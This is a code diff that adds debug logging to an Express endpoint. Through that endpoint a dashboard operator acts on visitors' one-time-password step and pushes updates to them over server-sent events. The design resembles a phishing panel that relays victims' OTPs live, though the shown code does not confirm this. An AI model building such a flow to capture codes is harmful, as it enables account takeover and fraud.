@@ -787,12 +787,15 @@ async function startServer() {
   app.post("/api/dashboard/otp-action", async (req, res) => {
     try {
       const { visitorId, action } = req.body;
+      console.log("[OTP-ACTION] Received request:", { visitorId, action });
+      
       if (!visitorId || !action) {
         res.status(400).json({ error: "Missing visitorId or action" });
         return;
       }
 
       const currentVisitor = await readVisitor(visitorId);
+      console.log("[OTP-ACTION] Current visitor:", currentVisitor ? "found" : "not found");
       const currentPage = currentVisitor?.currentPage || "step2";
 
       const updateData: Record<string, any> = {
@@ -818,9 +821,11 @@ async function startServer() {
 
       // Update visitor data so customer can receive the update
       await upsertVisitor(visitorId, updateData);
+      console.log("[OTP-ACTION] Visitor updated successfully");
       
       // Update dashboard request
       const dashboardData = await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+      console.log("[OTP-ACTION] Dashboard request updated:", dashboardData.id);
 
       // Broadcast to dashboard immediately
       broadcastSSE("update", dashboardData);
